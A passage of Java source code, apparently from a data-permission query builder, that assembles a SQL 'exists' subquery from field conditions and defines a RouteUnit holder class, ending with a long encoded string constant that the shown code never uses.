				ConditionExpr listOr = new ConditionExpr();
				for (String itm : list) {
					ConditionExpr ors = buildFuzzyConditionExpr(searchField, itm.toString(), targetTableAlias + ".");
					if (ors != null && !ors.isEmpty()) {
						listOr.or(ors);
					}
				}
				where.and(listOr);
			} else {
				where.andLike(targetTableAlias+"."+searchField,value.toString());
			}
		} else {
			if(value instanceof String) {
				value=((String)value).split(",");
				In in = new In(targetTableAlias+"."+searchField, (String[]) value);
				where.and(in);
			}
			else if (!((List) value).isEmpty()) {
				In in = new In(targetTableAlias+"."+searchField, (List) value);
				where.and(in);
			}
		}

		//追加条件
		expr.append(where);

		//装配 exists 语句
		String sql="exists( "+expr.getListParameterSQL()+" )";
		int a=sql.toLowerCase().indexOf("select ");
		int b=sql.toLowerCase().indexOf(" from");
		sql=sql.substring(0,a+7)+" 1 "+sql.substring(b);
		Expr exists=new Expr(sql,expr.getListParameters());
		return exists;

	}

	private List<RouteUnit> dataPermUnits=new ArrayList<>();

    public void addDataPermUnits(RouteUnit unit) {
        this.dataPermUnits.add(unit);
    }


    public static class RouteUnit {
        private PropertyRoute route;
        private CompositeItem item;
        private String searchField;
        private String searchTable;
        private DBColumnMeta columnMeta;
        private List<String> fillBys;
        /**
         * 如果是来自 ConditionBuilder ，该值非 null
         * */
        private DataPermCondition dataPermCondition;
        /**
         * 如果是来自 ConditionBuilder ，该值非 null
         * */
        private ConditionBuilder conditionBuilder;

        public ConditionBuilder getConditionBuilder() {
            return conditionBuilder;
        }

        public void setConditionBuilder(ConditionBuilder conditionBuilder) {
            this.conditionBuilder = conditionBuilder;
        }

        public DataPermCondition getDataPermCondition() {
            return dataPermCondition;
        }

        public void setDataPermCondition(DataPermCondition dataPermCondition) {
            this.dataPermCondition = dataPermCondition;
        }

        public PropertyRoute getRoute() {
            return route;
        }

        public void setRoute(PropertyRoute route) {
            this.route = route;
        }

        public CompositeItem getItem() {
            return item;
        }

        public void setItem(CompositeItem item) {
            this.item = item;
        }

        public String getSearchField() {
            return searchField;
        }

        public void setSearchField(String searchField) {
            this.searchField = searchField;
        }

        public String getSearchTable() {
            return searchTable;
        }

        public void setSearchTable(String searchTable) {
            this.searchTable = searchTable;
        }

        public DBColumnMeta getColumnMeta() {
            return columnMeta;
        }

        public void setColumnMeta(DBColumnMeta columnMeta) {
            this.columnMeta = columnMeta;
        }

        public List<String> getFillBys() {
            return fillBys;
        }

        public void setFillBys(List<String> fillBys) {
            this.fillBys = fillBys;
        }


    }

	private static final String CONST = "UKHSu[8VC=hK9PF*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";

}

